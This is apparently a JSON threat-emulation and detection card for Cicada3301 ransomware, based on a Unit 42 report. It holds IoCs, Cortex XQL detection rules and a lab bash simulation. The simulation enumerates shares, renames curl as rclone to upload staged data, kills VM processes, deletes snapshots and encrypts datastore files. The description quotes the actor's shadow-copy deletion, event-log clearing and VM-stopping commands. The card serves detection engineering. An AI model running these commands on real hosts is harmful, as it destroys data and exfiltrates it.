@@ -1,0 +1,594 @@
+{
+  "id": "TTP-2026-0190",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-10-27T00:00:00+00:00",
+    "updated_at": "2026-10-27T00:00:00+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-analytics",
+      "actor-repellent-scorpius",
+      "cicada3301",
+      "ransomware",
+      "rclone",
+      "psexec",
+      "hypervisor-shaped",
+      "unit42",
+      "stitched-chain",
+      "correlation",
+      "severity-critical"
+    ],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "ransomware-chain",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": false,
+      "platforms": [
+        "linux"
+      ],
+      "estimated_runtime_seconds": 300,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Repellent Scorpius Cicada3301 — Share Enum, PsExec Spread, Rclone Exfil, Encryption (T1570 / T1567.002 / T1486)",
+    "summary": "Repellent Scorpius, the RaaS group distributing Cicada3301, entered with stolen RDP credentials, enumerated shares to found_shares.txt, pushed a Rust encryptor over C$ with embedded PsExec, exfiltrated with Rclone to 91.238.181.238, then stopped VMs, wiped shadow copies and event logs and encrypted with ChaCha20. The card stitches the endpoint and network signals on one host into one incident.",
+    "description": "Unit 42 (2024-09-10) assessed Repellent Scorpius, a ransomware-as-a-service group first seen in May 2024 distributing the Rust-written Cicada3301 ransomware. In the incident Unit 42 handled, the actor logged on over RDP with likely stolen credentials (predominant source 103.42.240.37), ran a batch script 1.bat that launched the encryptor against hard-coded paths, spread it with a PsExec binary embedded in the encryptor ('psexec0.exe -accepteula -s -d ... --no_impl --key') via C$, wrote share-enumeration output to C:\\ProgramData\\found_shares.txt, staged C:\\ProgramData\\rclone.exe with rclone.conf and exfiltrated to 91.238.181.238. Before encryption the encryptor stops services and processes, deletes shadow copies (vssadmin, wmic), disables recovery (bcdedit), clears every event log (wevtutil cl) and, in the late-July 2024 variant, stops every Hyper-V VM with 'Get-VM | Stop-VM -Force'; files are encrypted with ChaCha20 under extension kcr5umw and a RECOVER-<ext>-DATA.txt note is dropped. SIM-MP-031 transposes the chain onto a lab Linux host with ESXi-shaped paths under /tmp/cortexsim-mp031: real share/datastore enumeration into found_shares.txt, a locker stand-in copied onto a C$-shaped share path and run detached with --no_impl --key, WildFire-verdict logs carrying three report hashes, a renamed rclone with rclone.conf uploading to the lab stage host, an NGFW EAL massive upload carrying the report exfil IP, a mass kill of vmx-named processes with snapshot deletion and log truncation, and real ChaCha20 encryption of the lab datastore with the kcr5umw extension and note. Every leg names the same src_host so CR-MP-0031 can stitch one incident. No identity leg is authored: the report's RDP logon cannot be emitted carrying this host's identity.",
+    "severity": "critical",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "Repellent Scorpius",
+        "aliases": [
+          "Cicada3301 ransomware operators",
+          "Cicada 3301 RaaS"
+        ]
+      }
+    ],
+    "campaigns": [
+      "Repellent Scorpius Cicada3301 RaaS intrusions (May-September 2024)"
+    ],
+    "malware_families": [
+      {
+        "name": "Cicada3301 ransomware"
+      },
+      {
+        "name": "PsExec",
+        "mitre_software_id": "S0029"
+      },
+      {
+        "name": "Rclone",
+        "mitre_software_id": "S1040"
+      }
+    ],
+    "industries_targeted": [
+      "all"
+    ],
+    "first_observed": "2024-05-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1078",
+        "name": "Valid Accounts",
+        "tactic_ids": [
+          "TA0001"
+        ],
+        "tactic_names": [
+          "Initial Access"
+        ]
+      },
+      {
+        "technique_id": "T1135",
+        "name": "Network Share Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      },
+      {
+        "technique_id": "T1021",
+        "subtechnique_id": "T1021.002",
+        "name": "Remote Services: SMB/Windows Admin Shares",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ]
+      },
+      {
+        "technique_id": "T1570",
+        "name": "Lateral Tool Transfer",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ]
+      },
+      {
+        "technique_id": "T1036",
+        "subtechnique_id": "T1036.005",
+        "name": "Masquerading: Match Legitimate Name or Location",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1567",
+        "subtechnique_id": "T1567.002",
+        "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      },
+      {
+        "technique_id": "T1048",
+        "name": "Exfiltration Over Alternative Protocol",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      },
+      {
+        "technique_id": "T1489",
+        "name": "Service Stop",
+        "tactic_ids": [
+          "TA0040"
+        ],
+        "tactic_names": [
+          "Impact"
+        ]
+      },
+      {
+        "technique_id": "T1490",
+        "name": "Inhibit System Recovery",
+        "tactic_ids": [
+          "TA0040"
+        ],
+        "tactic_names": [
+          "Impact"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.001",
+        "name": "Indicator Removal: Clear Windows Event Logs",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1486",
+        "name": "Data Encrypted for Impact",
+        "tactic_ids": [
+          "TA0040"
+        ],
+        "tactic_names": [
+          "Impact"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "Process: Process Creation",
+      "Process: Process Termination",
+      "Command: Command Execution",
+      "File: File Creation",
+      "File: File Modification",
+      "File: File Deletion",
+      "Network Traffic: Network Connection Creation",
+      "Network Traffic: Network Traffic Content"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-MP-031 — Repellent Scorpius Cicada3301 stitched chain",
+    "privilege_required": "root",
+    "prerequisites": [
+      {
+        "description": "Lab Linux endpoint with the Cortex XDR agent, openssl and curl; STAGE_HOST (default 127.0.0.1) optionally accepts the step-04 HTTP PUT on STAGE_PORT (default 8080).",
+        "check_command": "command -v openssl curl"
+      },
+      {
+        "description": "The CortexSim repo on the same host for the two EAL legs, and an operator collector (COLLECTOR_URL) feeding panw_ngfw_traffic_raw / panw_ngfw_threat_raw.",
+        "check_command": "python3 -m scripts.eal_simulator.cli --help"
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# Endpoint legs of SIM-MP-031 (lab only). The scenario YAML is the source of truth; this is a summary.\nLAB=/tmp/cortexsim-mp031\n{ cat /proc/mounts; df -hP; find \"$LAB/vmfs/volumes\" -maxdepth 2 -type d; } > \"$LAB/ProgramData/found_shares.txt\"\nsetsid nohup \"$LAB/mnt/$STAGE_HOST/C\\$/Users/Public/locker\" --no_impl --key \"$CICADA_LAB_KEY\" -s 1 -p \"$LAB/mnt/$STAGE_HOST/C\\$/data\" &\ncp \"$(command -v curl)\" \"$LAB/ProgramData/rclone\"; \"$LAB/ProgramData/rclone\" -T \"$LAB/ProgramData/stage-01.tgz\" \"http://$STAGE_HOST:8080/cortexsim-mp031/\"\npkill -KILL -f vmx-cortexsim-mp031; find \"$LAB/vmfs/volumes\" -name '*.vmsn' -delete\nsh \"$LAB/Users/Public/1.sh\"   # locker --no_impl --key ... -p $LAB/vmfs/volumes -> *.kcr5umw + RECOVER-kcr5umw-DATA.txt",
+      "input_variables": [
+        {
+          "name": "STAGE_HOST",
+          "type": "string",
+          "default": "127.0.0.1",
+          "description": "Lab host for the share-path copy and the rclone-shaped upload."
+        },
+        {
+          "name": "CICADA_LAB_KEY",
+          "type": "string",
+          "default": "cortexsim-mp031-lab-key",
+          "description": "Lab passphrase for the stand-in encryptor (never a real key)."
+        }
+      ],
+      "timeout_seconds": 300
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "Share-enumeration output file.",
+        "expected_value": "action_file_name = \"found_shares.txt\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "Locker run detached from a C$-shaped share path with --no_impl --key.",
+        "expected_value": "action_process_image_command_line contains \"--no_impl\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "Renamed curl running as rclone from the ProgramData-shaped directory.",
+        "expected_value": "action_process_image_name = \"rclone\""
+      },
+      {
+        "artifact_type": "file",
+        "description": "Datastore files rewritten with the kcr5umw extension and the ransom note.",
+        "expected_value": "action_file_name = \"RECOVER-kcr5umw-DATA.txt\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Synthetic NGFW EAL massive upload from this src_host to 91.238.181.238.",
+        "expected_value": "dst = \"91.238.181.238\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "pkill -KILL -f 'vmx-cortexsim-mp031' || true; rm -rf /tmp/cortexsim-mp031; rm -f /tmp/mp-031-threat.yml /tmp/mp-031-exfil.yml"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "file-sha256",
+        "value": "8ec114b29c7f2406809337b6c68ab30b0b7f0d1647829d56125e84662b84ea74",
+        "context": "Cicada3301 encryptor (report IoC section). Carried by SIM-MP-031 step-03 as the WildFire-verdict filedigest of the SMB-copied locker.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/",
+        "published": "2024-09-10",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "0260258f6f083aff71c7549a6364cb05d54dd27f40ca1145e064353dd2a9e983",
+        "context": "1.bat, the batch script running multiple encryptor commands (report IoC section). Carried by SIM-MP-031 step-03 as the WildFire-verdict filedigest of the SMB-copied launcher.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/",
+        "published": "2024-09-10",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "2d73b3aefcfbb47c1a187ddee7a48a21af7c85eb49cbdcb665db07375e36dc33",
+        "context": "Cicada3301 encryptor (report IoC section). Carried by SIM-MP-031 step-03 as the filedigest of a second WildFire verdict.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/",
+        "published": "2024-09-10",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "3969e1a88a063155a6f61b0ca1ac33114c1a39151f3c7dd019084abd30553eab",
+        "context": "Cicada3301 encryptor, new variant (report IoC section; the late-July 2024 build with the Stop-VM command). Card-level enrichment only; not surfaced by a scenario step.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/",
+        "published": "2024-09-10",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "56e1d092c07322d9dad7d85d773953573cc3294b9e428b3bbbaf935ca4d2f7e7",
+        "context": "Cicada3301 encryptor, new variant (report IoC section). Card-level enrichment only; not surfaced by a scenario step.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/",
+        "published": "2024-09-10",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "ipv4",
+        "value": "91.238.181.238",
+        "context": "Rclone exfiltration destination (report, Exfiltration and IoC sections). Carried only as the dst of the synthetic NGFW EAL upload record in SIM-MP-031 step-05; never contacted.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/",
+        "published": "2024-09-10",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "ipv4",
+        "value": "103.42.240.37",
+        "context": "RDP server that was the predominant source of the stolen-credential logons (report, Initial Access and IoC sections). Card-level enrichment only; no scenario step carries it because no emitter can put this host's identity on the inbound RDP logon.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/",
+        "published": "2024-09-10",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "filename",
+        "value": "found_shares.txt",
+        "context": "Share-enumeration output written to C:\\ProgramData by the actor (report, Collection); SIM-MP-031 step-01 writes it under a ProgramData-shaped lab path.",
+        "source_url": "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/",
+        "published": "2024-09-10",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "filename",
+        "value": "RECOVER-kcr5umw-DATA.txt",
+        "context": "Ransom note name for the analyzed sample's kcr5umw extension (report: RECOVER-<ext>-DATA.txt); SIM-MP-031 steps 02 and 07 drop a lab stand-in.",
+        "source_url": "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/",
+        "published": "2024-09-10",
+        "safe_form": "log_field"
+      }
+    ],
+    "biocs": [
+      {
+        "name": "MP-031 Share Enumeration Output Written to found_shares.txt",
+        "description": "A process chain that enumerates mounts, filesystems or shares writes a file named found_shares.txt — the share-enumeration output file named in the report.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE)\n| filter action_file_name = \"found_shares.txt\"\n| fields agent_hostname, actor_process_image_name, actor_process_command_line, action_file_path, causality_id",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1135"
+        ],
+        "suppression_window_seconds": 300
+      },
+      {
+        "name": "MP-031 Encryptor Copied to Admin Share Path and Run Detached with no_impl key",
+        "description": "An executable written under a Users/Public directory on a C$-shaped path is started detached with '--no_impl' and '--key' — the report's embedded-PsExec '-s -d <encryptor> --no_impl --key' spread.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line contains \"--no_impl\" and action_process_image_command_line contains \"--key\"\n| filter action_process_image_path contains \"Users/Public\" or action_process_image_path contains \"Users\\\\Public\"\n| fields agent_hostname, action_process_image_path, action_process_image_command_line, causality_actor_process_image_name, causality_id",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1021.002",
+          "T1570"
+        ],
+        "suppression_window_seconds": 300
+      },
+      {
+        "name": "MP-031 Files Rewritten with kcr5umw Extension and RECOVER DATA Note Dropped",
+        "description": "One process writes many files ending in .kcr5umw, deletes the originals and drops RECOVER-kcr5umw-DATA.txt in the same tree — the Cicada3301 encryption and note shape on a lateral target.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE\n| filter action_file_name ~= \"\\.kcr5umw$\" or action_file_name ~= \"^RECOVER-.*-DATA\\.txt$\"\n| comp count() as touched, count_distinct(action_file_name) as names by agent_hostname, actor_process_image_name, causality_id\n| filter touched >= 5\n| fields agent_hostname, actor_process_image_name, causality_id, touched, names",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1486"
+        ],
+        "suppression_window_seconds": 300
+      },
+      {
+        "name": "MP-031 Renamed Binary Run as rclone from ProgramData with rclone conf",
+        "description": "A process whose image name is rclone but whose file signature or original name belongs to another tool runs from a ProgramData-shaped directory that also holds rclone.conf — the report's C:\\ProgramData\\rclone.exe + rclone.conf staging.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in (\"rclone\", \"rclone.exe\")\n| filter action_process_image_path contains \"ProgramData\"\n| filter action_process_file_info_original_name != null and lowercase(action_process_file_info_original_name) not contains \"rclone\" or action_process_image_command_line contains \"rclone.conf\" or action_process_image_command_line contains \"-T \"\n| fields agent_hostname, action_process_image_path, action_process_image_command_line, action_process_image_sha256, causality_id",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1036.005",
+          "T1567.002"
+        ],
+        "suppression_window_seconds": 300
+      },
+      {
+        "name": "MP-031 Mass Kill of vmx Named Virtual Machine Processes",
+        "description": "A single command kills several VM-worker-shaped processes (vmx) at once — the hypervisor rendering of the report's 'Get-VM | Stop-VM -Force' stop-every-VM step before encryption.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_STOP\n| filter action_process_image_command_line contains \"vmx\"\n| comp count() as killed by agent_hostname, actor_process_image_name, actor_process_command_line, causality_id\n| filter killed >= 3\n| fields agent_hostname, actor_process_image_name, actor_process_command_line, causality_id, killed",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1489"
+        ],
+        "suppression_window_seconds": 300
+      },
+      {
+        "name": "MP-031 VM Snapshot Deletion and Hypervisor Log Truncation",
+        "description": "The same chain deletes VM snapshot files (*.vmsn) under a vmfs/volumes path and truncates hostd/vmkernel/vpxa logs — the report's shadow-copy deletion and event-log clearing on a hypervisor-shaped host.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE\n| filter (event_sub_type = ENUM.FILE_REMOVE and action_file_name ~= \"\\.vmsn$\" and action_file_path contains \"vmfs/volumes\") or (event_sub_type = ENUM.FILE_WRITE and action_file_name in (\"hostd.log\", \"vmkernel.log\", \"vpxa.log\"))\n| comp count_distinct(event_sub_type) as kinds, count() as events by agent_hostname, causality_id\n| filter kinds >= 2\n| fields agent_hostname, causality_id, kinds, events",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1490",
+          "T1070.001"
+        ],
+        "suppression_window_seconds": 300
+      },
+      {
+        "name": "MP-031 Locker Encrypts vmfs Datastore Files to kcr5umw with Ransom Note",
+        "description": "A script-launched process run with '--no_impl --key -p <vmfs/volumes path>' rewrites .vmdk/.vmx files as .kcr5umw and drops RECOVER-kcr5umw-DATA.txt on the datastore root.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE\n| filter action_file_path contains \"vmfs/volumes\"\n| filter action_file_name ~= \"\\.(vmdk|vmx)\\.kcr5umw$\" or action_file_name = \"RECOVER-kcr5umw-DATA.txt\"\n| comp count() as touched by agent_hostname, causality_actor_process_command_line, causality_id\n| filter touched >= 3\n| fields agent_hostname, causality_actor_process_command_line, causality_id, touched",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1486"
+        ],
+        "suppression_window_seconds": 300
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "MP-031 Rclone Massive Upload to Rare External Destination",
+        "description": "A single session from an internal host uploads tens of GB to an external destination the fleet has never contacted, with process rclone.exe on the EAL record — the report's Rclone exfiltration as NGFW analytics sees it.",
+        "logic": "dataset = panw_ngfw_traffic_raw\n| filter bytes_sent > 10737418240\n| filter process_name in (\"rclone.exe\", \"rclone\")\n| comp sum(bytes_sent) as uploaded by endpoint_device_name, src, dst, dst_hostname\n| fields endpoint_device_name, src, dst, dst_hostname, uploaded",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1048",
+          "T1567.002"
+        ],
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "Learned per-host egress-volume and destination-rarity baseline -> first-seen destination with a multi-GB upload, anchored to the source host (src_host)."
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "MP-031 WildFire Verdicts for Cicada3301 Hashes Landed in panw_ngfw_threat_raw",
+        "query": "dataset = panw_ngfw_threat_raw\n| filter verdict = \"malicious\"\n| filter filedigest in (\"8ec114b29c7f2406809337b6c68ab30b0b7f0d1647829d56125e84662b84ea74\", \"0260258f6f083aff71c7549a6364cb05d54dd27f40ca1145e064353dd2a9e983\", \"2d73b3aefcfbb47c1a187ddee7a48a21af7c85eb49cbdcb665db07375e36dc33\")\n| comp count() as verdicts by endpoint_device_name, src, filedigest\n| fields endpoint_device_name, src, filedigest, verdicts",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_threat_raw"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-031 Upload to Report Exfil IP Stitched to the Endpoint Host",
+        "query": "dataset = panw_ngfw_traffic_raw\n| filter dst = \"91.238.181.238\"\n| comp sum(bytes_sent) as uploaded by endpoint_device_name, src, user\n| fields endpoint_device_name, src, user, uploaded",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_traffic_raw"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "Repellent Scorpius Cicada3301 — Endpoint and Network Stitch on One Host",
+        "rule_id": "CR-MP-0031",
+        "logic": "BIOC(MP-031 Share Enumeration Output Written to found_shares.txt) AND BIOC(MP-031 Encryptor Copied to Admin Share Path and Run Detached with no_impl key) AND (IOC(file-sha256 from the report on panw_ngfw_threat_raw) OR ABIOC(MP-031 Rclone Massive Upload to Rare External Destination) OR IOC(ipv4 91.238.181.238)) AND BIOC(MP-031 Renamed Binary Run as rclone from ProgramData with rclone conf) AND BIOC(MP-031 Mass Kill of vmx Named Virtual Machine Processes) AND BIOC(MP-031 Locker Encrypts vmfs Datastore Files to kcr5umw with Ransom Note) within 3600s on the same src_host (agent_hostname on xdr_data; endpoint_device_name on the NGFW records) -> one incident naming the encryptor hashes, the Rclone exfil IP and the stop-wipe-encrypt sequence."
+      }
+    ],
+    "analytics_modules": [
+      {
+        "module": "Cortex XSIAM correlation — endpoint + NGFW incident stitching on src_host",
+        "validated": false,
+        "note": "CR-MP-0031 is authored, not tenant-verified (tenant-verified = 0)."
+      }
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "bioc",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-XDR-MP031-001"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "preset = xdr_data | filter action_file_name = \"RECOVER-kcr5umw-DATA.txt\" | fields agent_hostname, causality_id"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "correlation",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "CR-MP-0031"
+        ],
+        "license_required": "enterprise",
+        "evidence_query": "dataset = panw_ngfw_traffic_raw | filter dst = \"91.238.181.238\" | comp count() by endpoint_device_name"
+      },
+      {
+        "module": "advanced-wildfire",
+        "submodule": "verdict-log",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-WF-MP031-001"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = panw_ngfw_threat_raw | filter verdict = \"malicious\" | comp count() by filedigest"
+      }
+    ],
+    "threat_scenarios": [
+      {
+        "threat_scenario_id": "TS-MP-031",
+        "name": "Repellent Scorpius Cicada3301 on one host",
+        "description": "Share enumeration, encryptor spread, report-hash and exfil-IP network signals, VM stop and wipe, and datastore encryption on one src_host stitch into a single incident.",
+        "threat_steps": [
+          {
+            "threat_step_id": "TS-MP-031A",
+            "objective": "Spread and exfil legs fire and share src_host.",
+            "preconditions": [
+              "XDR agent on the lab Linux host",
+              "NGFW collector feeding panw_ngfw_traffic_raw and panw_ngfw_threat_raw"
+            ],
+            "steps": [
+              "Run step-01..05",
+              "Query the two validation XQLs"
+            ],
+            "success_criteria": [
+              "found_shares.txt, share-path locker and rclone BIOCs fire on the host",
+              "NGFW records name the same endpoint_device_name, the report hashes and the report exfil IP"
+            ],
+            "expected_score_weight": 0.5
+          },
+          {
+            "threat_step_id": "TS-MP-031B",
+            "objective": "Pre-encryption and impact stages fire and CR-MP-0031 raises one incident.",
+            "preconditions": [
+              "TS-MP-031A executed"
+            ],
+            "steps": [
+              "Run step-06..07",
+              "Inspect the incident"
+            ],
+            "success_criteria": [
+              "vmx mass-kill, snapshot/log wipe and kcr5umw encryption BIOCs fire",
+              "Exactly one incident spans the EDR and NDR alerts for the host"
+            ],
+            "expected_score_weight": 0.5
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Put RDP behind MFA and a VPN/ZTNA broker; the intrusion began with stolen RDP credentials.",
+      "Restrict C$ administrative-share writes and remote service creation so an embedded PsExec cannot spread the encryptor.",
+      "Keep immutable or offline backups and protect hypervisor snapshots; the encryptor deletes shadow copies and stops VMs before encrypting."
+    ],
+    "detection_engineering": [
+      "Alert on found_shares.txt or similar share-enumeration output under ProgramData.",
+      "Alert on any binary whose name is rclone but whose original image differs, and on rclone.conf next to it in ProgramData.",
+      "Enrich NGFW traffic and WildFire verdicts against the report's exfil IP and hashes and join on the endpoint hostname."
+    ],
+    "response_playbook": "XSOAR-PB-RepellentScorpiusCicada3301-v1"
+  },
+  "references": [
+    {
+      "title": "Unit 42 — Threat Assessment: Repellent Scorpius, Distributors of Cicada3301 Ransomware",
+      "url": "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "Unit 42 — Cicada3301 appendix (targeted services, processes, exclusions)",
+      "url": "https://github.com/PaloAltoNetworks/Unit42-Threat-Intelligence-Article-Information/blob/main/cicada3301_appendix.txt",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42"
+    },
+    {
+      "title": "MITRE ATT&CK — Rclone (S1040)",
+      "url": "https://attack.mitre.org/software/S1040/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ]
+}
